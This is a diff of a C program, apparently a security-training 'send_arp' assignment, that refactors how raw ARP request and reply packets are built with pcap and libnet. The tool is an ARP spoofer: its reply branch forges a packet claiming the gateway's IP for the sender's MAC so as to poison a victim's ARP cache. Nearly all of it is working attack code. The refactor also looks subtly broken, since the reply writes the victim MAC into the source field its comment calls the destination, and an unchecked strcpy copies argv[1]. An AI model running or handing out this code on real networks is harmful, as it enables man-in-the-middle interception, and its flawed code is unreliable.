@@ -22,6 +22,11 @@
 
 #define IPSTR_MAX 16
 #define MACSTR_MAX 18
+#define IP_ALEN 4
+#define ARPPKT_SIZE 42
+#define ETHHDR_SIZE 14
+#define ARPHDR_SIZE 8
+#define ARPDAT_SIZE 20
 
 char victim_mac_addr_str[MACSTR_MAX];
 char victim_ip_addr_str[IPSTR_MAX];
@@ -74,168 +79,118 @@ void packetfilter_callback(u_char *useless, const struct pcap_pkthdr *pkthdr, co
 }
 
 void *get_victim_mac_pcap_thread(void *useless) {
-    char *dev;
     char errbuf[PCAP_ERRBUF_SIZE];
-    bpf_u_int32 netp;
-    bpf_u_int32 maskp;
-    pcap_t *pcd;    // packet capture descriptor
+    bpf_u_int32 netp, maskp;
     struct bpf_program fp;
 
-    dev = pcap_lookupdev(errbuf);       // dev = "ens33"으로 해도 무방
-    if(dev == NULL) {
-        printf("%s\n", errbuf);
-        exit(1);
-    }
-
-    // get net, mask info
+    char *dev = pcap_lookupdev(errbuf);       // dev = "ens33"으로 해도 무방
+    if(dev == NULL) { printf("%s\n", errbuf); exit(1); }
     int ret = pcap_lookupnet(dev, &netp, &maskp, errbuf);
-    if(ret == -1) {
-        printf("%s\n", errbuf);
-        exit(1);
-    }
-
-    pcd = pcap_open_live(dev, BUFSIZ, PROMISCUOUS, -1, errbuf);
-    if(pcd == NULL) {
-        printf("%s\n", errbuf);
-        exit(1);
-    }
-
-    // filter option compile
-    if(pcap_compile(pcd, &fp, "", 0, netp) == -1) {      //if(pcap_compile(pcd, &fp, "argv[2]", 0, netp) == -1) {
-        printf("compile error\n");
-        exit(1);
-    }
-
-    // filter option setting
-    if(pcap_setfilter(pcd, &fp) == -1) {
-        printf("setfilter error\n");
-        exit(0);
-    }
+    if(ret == -1) { printf("%s\n", errbuf); exit(1); }
+    pcap_t *pcd = pcap_open_live(dev, BUFSIZ, PROMISCUOUS, -1, errbuf);
+    if(pcd == NULL) { printf("%s\n", errbuf); exit(1); }
+    if(pcap_compile(pcd, &fp, "", 0, netp) == -1) { printf("compile error\n"); exit(1); }
+    if(pcap_setfilter(pcd, &fp) == -1) { printf("setfilter error\n"); exit(0); }
 
     printf("[*] Getting Target Mac Address");
-
-    // int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user)
-    // param2(int cnt) : 패킷 캡쳐 몇번(0이면 infinite)
-    // param3 : filtered packet이 들어오면 실행되는 handler callback func
-    pcap_loop(pcd, 0, packetfilter_callback, NULL);     //pcap_loop(pcd, atoi(argv[1]), packetfilter_callback, NULL);
+    pcap_loop(pcd, 0, packetfilter_callback, NULL);
 
     return 0;
 }
 
 void build_arp_packet(u_char* arp_packet, int operation) {
-    unsigned char victim_mac_addr[6];
-    unsigned char my_mac_addr[6];
+    unsigned char build_packet[ETHHDR_SIZE + ARPHDR_SIZE + ARPDAT_SIZE];
+
+    unsigned char victim_mac_addr[ETH_ALEN];
+    unsigned char my_mac_addr[ETH_ALEN];
+    unsigned char myip_byte_arr[IP_ALEN];
+    unsigned char victim_ip_byte_arr[IP_ALEN];
+    unsigned char gateway_ip_byte_arr[4];
+
+    struct libnet_ethernet_hdr *eth_header;
+    struct libnet_arp_hdr *arp_header;
+    struct arp_data {
+        unsigned char ar_sha[ETH_ALEN];     /* Sender Hardware Address */
+        unsigned char ar_sip[IP_ALEN];            /* Sender IP Address */
+        unsigned char ar_tha[ETH_ALEN];     /* Target Hardware Address */
+        unsigned char ar_tip[IP_ALEN];            /* Target IP Address */
+    } *custom_arp_data;
 
     // my mac string -> mac 6byte
     sscanf(my_mac, "%2x:%2x:%2x:%2x:%2x:%2x", my_mac_addr, my_mac_addr+1, my_mac_addr+2, my_mac_addr+3, my_mac_addr+4, my_mac_addr+5);
+    sscanf(my_ip, "%d.%d.%d.%d", myip_byte_arr, myip_byte_arr+1, myip_byte_arr+2, myip_byte_arr+3);
+    sscanf(victim_ip_addr_str, "%d.%d.%d.%d", victim_ip_byte_arr, victim_ip_byte_arr+1, victim_ip_byte_arr+2, victim_ip_byte_arr+3);
+    sscanf(gateway_ip, "%d.%d.%d.%d", gateway_ip_byte_arr, gateway_ip_byte_arr+1, gateway_ip_byte_arr+2, gateway_ip_byte_arr+3);
+
+    eth_header = (libnet_ethernet_hdr *)build_packet;
+    arp_header = (libnet_arp_hdr *)(build_packet + ETHHDR_SIZE);
+    custom_arp_data = (arp_data *)(build_packet + ETHHDR_SIZE + ARPHDR_SIZE);
+
+    // ehternet header build : destination MAC address, source MAC address(my mac), ether_type(ARP)
+    for(int i=0; i<ETH_ALEN; i++) eth_header->ether_dhost[i] = '\xff';
+    for(int i=0; i<ETH_ALEN; i++) eth_header->ether_shost[i] = my_mac_addr[i];
+    eth_header->ether_type = htons(ETHERTYPE_ARP);
+
+    // arp header
+    arp_header->ar_hrd = htons(ARPHRD_ETHER);                      // Hardware type : 0x0001
+    arp_header->ar_pro = htons(ETHERTYPE_IP);                      // Protocol type : 0x0800(ipv4)
+    arp_header->ar_hln = 0x06; arp_header->ar_pln = 0x04;          // Hardware size : 0x06, Protocol size : 0x04
 
     // ARP Request Packet
     if(operation == 1) {
-        arp_packet[20]='\x00'; arp_packet[21]='\x01';   // Opcode : 0x0001(request)
-
-        // ehternet header : destination MAC address
-        arp_packet[0] = '\xff'; arp_packet[1] = '\xff'; arp_packet[2] = '\xff';
-        arp_packet[3] = '\xff'; arp_packet[4] = '\xff'; arp_packet[5] = '\xff';
-
-        // arp header : sender mac address(my mac)
-        for(int i=0; i<6; i++)
-            arp_packet[i+22]=my_mac_addr[i];
-
-        // arp header : sender ip address(my ip)
-        unsigned char ip_byte_arr[4];
-        sscanf(my_ip, "%d.%d.%d.%d", ip_byte_arr, ip_byte_arr+1, ip_byte_arr+2, ip_byte_arr+3);
-        arp_packet[28]=ip_byte_arr[0]; arp_packet[29]=ip_byte_arr[1];
-        arp_packet[30]=ip_byte_arr[2]; arp_packet[31]=ip_byte_arr[3];
-
-        // arp header : target mac address(00:00:00:00:00:00)
-        arp_packet[32] = '\x00'; arp_packet[33] = '\x00'; arp_packet[34] = '\x00';
-        arp_packet[35] = '\x00'; arp_packet[36] = '\x00'; arp_packet[37] = '\x00';
-
-        // arp header : target ip address(victim ip)
-        sscanf(victim_ip_addr_str, "%d.%d.%d.%d", ip_byte_arr, ip_byte_arr+1, ip_byte_arr+2, ip_byte_arr+3);
-        arp_packet[38]=ip_byte_arr[0]; arp_packet[39]=ip_byte_arr[1];
-        arp_packet[40]=ip_byte_arr[2]; arp_packet[41]=ip_byte_arr[3];
+        arp_header->ar_op = htons(ARPOP_REQUEST);                                           // Opcode : 0x0001(request)
+        for(int i=0; i<ETH_ALEN; i++) custom_arp_data->ar_sha[i]=my_mac_addr[i];            // arp header : sender mac address(my mac)
+        for(int i=0; i<IP_ALEN; i++) custom_arp_data->ar_sip[i] = myip_byte_arr[i];         // arp header : sender ip address(my ip)
+        for(int i=0; i<ETH_ALEN; i++) custom_arp_data->ar_tha[i] = 0x00;                    // arp header : target mac address(00:00:00:00:00:00)
+        for(int i=0; i<IP_ALEN; i++) custom_arp_data->ar_tip[i] = victim_ip_byte_arr[i];    // arp header : target ip address(victim ip)
     }
     // ARP Reply Packet
     else if(operation == 2) {
-        arp_packet[20]='\x00'; arp_packet[21]='\x02';   // Opcode : 0x0002(reply)
-
         sscanf(victim_mac_addr_str, "%2x:%2x:%2x:%2x:%2x:%2x", victim_mac_addr, victim_mac_addr+1, victim_mac_addr+2, victim_mac_addr+3, victim_mac_addr+4, victim_mac_addr+5);
-        // ethernet header : destination MAC address
-        for(int i=0; i<6; i++)
-            arp_packet[i] = victim_mac_addr[i];
 
-        // arp header : sender mac address(my mac)
-        for(int i=0; i<6; i++)
-            arp_packet[i+22]=my_mac_addr[i];
-
-        // arp header : sender ip address(gateway ip)
-        unsigned char ip_byte_arr[4];
-        sscanf(gateway_ip, "%d.%d.%d.%d", ip_byte_arr, ip_byte_arr+1, ip_byte_arr+2, ip_byte_arr+3);
-        arp_packet[28]=ip_byte_arr[0]; arp_packet[29]=ip_byte_arr[1];
-        arp_packet[30]=ip_byte_arr[2]; arp_packet[31]=ip_byte_arr[3];
-
-        // arp header : target mac address(victim mac)
-        for(int i=0; i<6; i++)
-            arp_packet[i+32] = victim_mac_addr[i];
-
-        // arp header : target ip address(victim ip)
-        sscanf(victim_ip_addr_str, "%d.%d.%d.%d", ip_byte_arr, ip_byte_arr+1, ip_byte_arr+2, ip_byte_arr+3);
-        arp_packet[38]=ip_byte_arr[0]; arp_packet[39]=ip_byte_arr[1];
-        arp_packet[40]=ip_byte_arr[2]; arp_packet[41]=ip_byte_arr[3];
+        for(int i=0; i<ETH_ALEN; i++) eth_header->ether_shost[i] = victim_mac_addr[i];      // ethernet header : destination MAC address
+        arp_header->ar_op = htons(ARPOP_REPLY);                                             // Opcode : 0x0002(reply)
+        for(int i=0; i<ETH_ALEN; i++) custom_arp_data->ar_sha[i] = my_mac_addr[i];          // arp header : sender mac address(my mac)
+        for(int i=0; i<IP_ALEN; i++) custom_arp_data->ar_sip[i] = gateway_ip_byte_arr[i];   // arp header : sender ip address(gateway ip)
+        for(int i=0; i<ETH_ALEN; i++) custom_arp_data->ar_tha[i] = victim_mac_addr[i];      // arp header : target mac address(victim mac)
+        for(int i=0; i<IP_ALEN; i++) custom_arp_data->ar_tip[i] = victim_ip_byte_arr[i];    // arp header : target ip address(victim ip)
     }
 
-    // ethernet header : source MAC address(my mac)
-    for(int i=0; i<6; i++)
-        arp_packet[i+6]=my_mac_addr[i];
-
-    // ethernet header : protocol type
-    arp_packet[12]='\x08'; arp_packet[13]='\x06';
-
-    // arp header
-    arp_packet[14]='\x00'; arp_packet[15]='\x01';   // Hardware type : 0x0001
-    arp_packet[16]='\x08'; arp_packet[17]='\x00';   // Protocol type : 0x0800(ipv4)
-    arp_packet[18]='\x06'; arp_packet[19]='\x04';   // Hardware size : 0x06, Protocol size : 0x04
+    memcpy(arp_packet, build_packet, ARPPKT_SIZE);
 }
 
 int main(int argc, char **argv) {
     char track[] = "취약점"; char name[] = "이우진";
-    char *dev;
-    int ret;
     char errbuf[PCAP_ERRBUF_SIZE];
-    bpf_u_int32 netp;
-    bpf_u_int32 maskp;
+    bpf_u_int32 netp, maskp;
+    //char target_ip[IPSTR_MAX];
 
-    pcap_t *pcd;    // packet capture descriptor
+    //printf("Enter Target IP Addr : ");
+    //scanf("%s", target_ip);
     strcpy(victim_ip_addr_str, argv[1]);
+    //strcpy(victim_ip_addr_str, target_ip);
 
     printf("=====================================\n");
     printf("[bob5][%s]send_arp[%s]\n\n", track, name);
     // get network dev name("ens33")
-    dev = pcap_lookupdev(errbuf);       // dev = "ens33"으로 해도 무방
+    char *dev = pcap_lookupdev(errbuf);       // dev = "ens33"으로 해도 무방
     if(dev == NULL) {
         printf("%s\n", errbuf);
         exit(1);
     }
     printf("DEV: %s\n", dev);
 
-    // get net, mask info
-    ret = pcap_lookupnet(dev, &netp, &maskp, errbuf);
+    int ret = pcap_lookupnet(dev, &netp, &maskp, errbuf);
     if(ret == -1) {
         printf("%s\n", errbuf);
         exit(1);
     }
 
-    // dev 에 대한 packet capture descriptor를 pcd에 저장.
-    // param1 : dev, param2 : snaplen(받아들일 수 있는 패킷의 최대 크기(byte),
-    // param3 : promiscuous mode(1), non promisc(0), param4 : to_ms(time out)
-    // param5 : error이면 NULL리턴 하고 ebuf에 에러 저장
-    pcd = pcap_open_live(dev, BUFSIZ, NONPROMISCUOUS, -1, errbuf);
+    pcap_t *pcd = pcap_open_live(dev, BUFSIZ, NONPROMISCUOUS, -1, errbuf);
     if(pcd == NULL) {
         printf("%s\n", errbuf);
         exit(1);
     }
-
 
     // /////////////////////////////////////////////////////////////////////////////////////////////////
     // Get Information(My IP Address, My MAC Address, Default Gateway IP Address, Victim MAC Address)
